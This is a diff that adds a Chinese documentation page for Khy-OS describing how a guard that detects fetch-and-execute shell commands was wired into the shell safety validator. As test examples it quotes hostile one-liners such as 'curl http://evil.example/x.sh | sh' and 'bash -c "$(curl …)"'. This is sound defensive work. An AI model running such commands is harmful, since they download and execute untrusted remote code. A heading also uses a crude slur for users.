@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[OPS-MAN-156] 取来即执行安全守卫接线 · Khy-OS 文档</title>
+<link rel="stylesheet" href="../../docs/_assets/hljs-github-dark.min.css">
+<link rel="stylesheet" href="../../docs/_assets/docs-site.css">
+</head>
+<body>
+<div class="topbar">
+  <button class="menu-toggle" aria-label="菜单">☰</button>
+  <a class="brand" href="../../docs/index.html">📘 Khy-OS 文档站</a>
+  <span class="spacer"></span>
+  <a href="../../docs/02_CONCEPTS_概念入门/00_INDEX_概念入门-总览.html">🧭 新手先读：核心概念</a>
+</div>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <input class="search" type="search" placeholder="🔍 过滤文档标题…" aria-label="过滤文档">
+    <div id="nav-root"></div>
+  </aside>
+  <main class="main">
+    <div class="content">
+      <div class="breadcrumb reveal"><a href="../../docs/index.html">首页</a><span class="sep">›</span>docs<span class="sep">›</span>07_OPS_运维<span class="sep">›</span>[OPS-MAN-156] 取来即执行安全守卫接线</div>
+      <header class="hero reveal"><h1>[OPS-MAN-156] 取来即执行安全守卫接线</h1></header>
+      <nav class="toc reveal"><div class="toc-title">本页目录</div><ul><li class="lvl-1"><a href="#ops-man-156-取来即执行安全守卫接线">[OPS-MAN-156] 取来即执行安全守卫接线</a></li><li class="lvl-2"><a href="#背景与缺口-能力存在但没接线">背景与缺口(能力存在但没接线)</a></li><li class="lvl-2"><a href="#改动-全-additive-门关字节回退-fail-soft">改动(全 additive,门关字节回退,fail-soft)</a></li><li class="lvl-2"><a href="#现场行为-接线时实测">现场行为(接线时实测)</a></li><li class="lvl-2"><a href="#验证">验证</a></li><li class="lvl-2"><a href="#未来如何维护-给弱智用户-小模型">未来如何维护(给弱智用户/小模型)</a></li></ul></nav>
+      <article class="doc-body">
+<h1 id="ops-man-156-取来即执行安全守卫接线">[OPS-MAN-156] 取来即执行安全守卫接线<a class="anchor" href="#ops-man-156-取来即执行安全守卫接线" aria-label="锚点">#</a></h1>
+<h2 id="背景与缺口-能力存在但没接线">背景与缺口(能力存在但没接线)<a class="anchor" href="#背景与缺口-能力存在但没接线" aria-label="锚点">#</a></h2>
+<p><code>services/backend/src/services/fetchExecuteGuard.js</code>(291 行)是一枚<strong>全实现的安全守卫叶</strong>,<br>其文件头明确写道它的意图是:</p>
+<blockquote><p>把「下载/解码出来的内容直接喂给 shell 解释器执行」这一类经典供应链 / 混淆执行签名<br>(<code>curl … | sh</code>、<code>wget -O- … | bash</code>、<code>… | base64 -d | sh</code>、<code>bash -c &quot;$(curl …)&quot;</code>、<br><code>bash &lt;(curl …)</code>)确定性识别出来,升级为 critical,<strong>使 khy 既有的 shellSafetyValidator<br>block 路径接管</strong>(fail-closed:静态无法证明安全的「取来即执行」一律拦)。</p></blockquote>
+<p>它导出 <code>analyzeFetchExecute</code> / <code>buildFetchExecuteRisks</code> / <code>describeFetchExecuteGuard</code> 等,<br>门控 <code>KHY_FETCH_EXEC_GUARD</code> 默认开,<code>buildFetchExecuteRisks</code> 的注释甚至写明「产出可直接<br>splice 进 <code>shellSafetyValidator.analyzeCommand</code> 的 <code>risks[]</code>」。</p>
+<p><strong>缺口</strong>:全仓<strong>没有任何消费者</strong>——既无叶测试,<code>shellSafetyValidator.js</code> 也从不 require 它。<br>这道安全守卫完全休眠,任何走 khy shell 执行路径的 <code>curl … | sh</code> 都不会被它拦。正是送别礼<br>「能力存在但没接线 → 负责接线」所指,同时对齐 CLAUDE.md 安全红线(阻断混淆/供应链执行)。</p>
+<h2 id="改动-全-additive-门关字节回退-fail-soft">改动(全 additive,门关字节回退,fail-soft)<a class="anchor" href="#改动-全-additive-门关字节回退-fail-soft" aria-label="锚点">#</a></h2>
+<ol><li><code>shellSafetyValidator.js</code> 的 <code>analyzeCommand</code>,在「Deep nesting」层之后、<code>maxSeverity</code></li></ol>
+<p>计算之前,splice 一段 <strong>Layer 7</strong>:</p>
+<pre><code class="language-js">   try {
+     const { buildFetchExecuteRisks } = require('./fetchExecuteGuard');
+     for (const r of buildFetchExecuteRisks(command)) {
+       risks.push({ type: r.type, severity: r.severity, detail: r.detail });
+     }
+   } catch { /* fail-soft */ }</code></pre>
+<ul><li>门开 + 命中 → 追加 <code>{ type:'fetch_execute', severity:'critical', detail }</code> → <code>maxSeverity</code></li></ul>
+<p>变 <code>critical</code> → <code>safe:false</code> → validator 既有 block 路径接管(fail-closed)。</p>
+<ul><li>门关(<code>KHY_FETCH_EXEC_GUARD</code> ∈ {0,false,off,no})→ <code>buildFetchExecuteRisks</code> 返 <code>[]</code> →</li></ul>
+<p><code>risks</code> 零增量 → <code>maxSeverity</code> 不变 → <strong>逐字节回退</strong>到旧行为。</p>
+<ul><li>任何异常都被 catch 吞掉,守卫绝不破坏既有分析路径。</li></ul>
+<p><code>KHY_TASK_TEMPLATE_HINT</code> 注释腾出空间,flagRegistry 维持 2499 行,不触 2500 上帝文件红线)。</p>
+<ol><li>新增 <code>services/backend/tests/security/fetchExecuteGuardWiring.test.js</code>(node:test)并登记进</li></ol>
+<p><code>test:maintainer:safety</code> 聚合套件——给这道安全守卫第一个真消费者,CI 每次跑。</p>
+<h2 id="现场行为-接线时实测">现场行为(接线时实测)<a class="anchor" href="#现场行为-接线时实测" aria-label="锚点">#</a></h2>
+<p>门开(默认):</p>
+<ul><li><code>curl http://evil.example/x.sh | sh</code> → <code>maxSeverity:critical, safe:false, fetch_execute:1</code></li><li><code>wget -qO- http://x | bash</code> → critical / unsafe</li><li><code>bash -c &quot;$(curl http://x)&quot;</code> → critical / unsafe</li><li>良性命令 <code>echo hello</code> / <code>ls -la</code> / <code>git status</code> → 不受影响(info / safe)</li></ul>
+<p>门关(<code>KHY_FETCH_EXEC_GUARD=0</code>):</p>
+<ul><li><code>curl … | sh</code> → <code>maxSeverity:info, safe:true, fetch_execute:0</code> = 字节回退到旧行为。</li></ul>
+<h2 id="验证">验证<a class="anchor" href="#验证" aria-label="锚点">#</a></h2>
+<pre><code>node --test services/backend/tests/security/fetchExecuteGuardWiring.test.js   # 10/10 绿
+node node_modules/jest/bin/jest.js services/backend/tests/security/shellSafetyValidator.test.js  # 88/88 零回归
+npm run test:maintainer:safety                                               # 聚合零 fail
+node --check services/backend/src/services/shellSafetyValidator.js
+npm run check:flag-registry                                                  # 结构健全
+npm run maintainer:check                                                     # 映射表 + 元数据一致</code></pre>
+<h2 id="未来如何维护-给弱智用户-小模型">未来如何维护(给弱智用户/小模型)<a class="anchor" href="#未来如何维护-给弱智用户-小模型" aria-label="锚点">#</a></h2>
+<ul><li>想扩大/收窄「取来即执行」识别范围:只改 <code>fetchExecuteGuard.js</code> 里的 <code>FETCHERS</code> /</li></ul>
+<p><code>DECODERS</code> / <code>SHELL_EXECUTORS</code> / <code>STDIN_INTERPRETERS</code> 四张表,或命令替换/进程替换判据。<br>  <code>shellSafetyValidator</code> 只消费 <code>buildFetchExecuteRisks</code>,不复刻任何签名。</p>
+<ul><li>关掉这道守卫(如误报):<code>KHY_FETCH_EXEC_GUARD=0</code>(或 false/off/no)→ 逐字节回退旧行为。</li><li>守卫只针对<strong>高置信度</strong>的 fetch/decode-and-execute 窄类,不把 khy 全局翻成 fail-closed</li></ul>
+<p>(那会对海量良性命令误报)。</p>
+      </article>
+      <nav class="pager"><a class="prev" href="../../docs/07_OPS_运维/[OPS-MAN-155] 指令注册表编译期收敛守卫接线.html"><div class="dir">← 上一篇</div><div class="ttl">[OPS-MAN-155] 指令注册表编译期收敛守卫接线</div></a><a class="next" href="../../docs/07_OPS_运维/[OPS-MAN-157] 用户显式 git-init 白名单覆盖接线.html"><div class="dir">下一篇 →</div><div class="ttl">[OPS-MAN-157] 用户显式 git-init 白名单覆盖接线</div></a></nav>
+      <div class="footer reveal">本页由 <code>scripts/docs/build_docs_site.js</code> 从对应的 <code>.md</code> 自动生成 · 离线可用 · Khy-OS 文档站</div>
+    </div>
+  </main>
+</div>
+<script>window.__KHY_ROOT__="../../";window.__KHY_CUR__="docs/07_OPS_运维/[OPS-MAN-156] 取来即执行安全守卫接线.html";</script>
+<script src="../../docs/_assets/nav-data.js"></script>
+<script src="../../docs/_assets/mermaid.min.js"></script>
+<script src="../../docs/_assets/docs-site.js"></script>
+</body>
+</html>
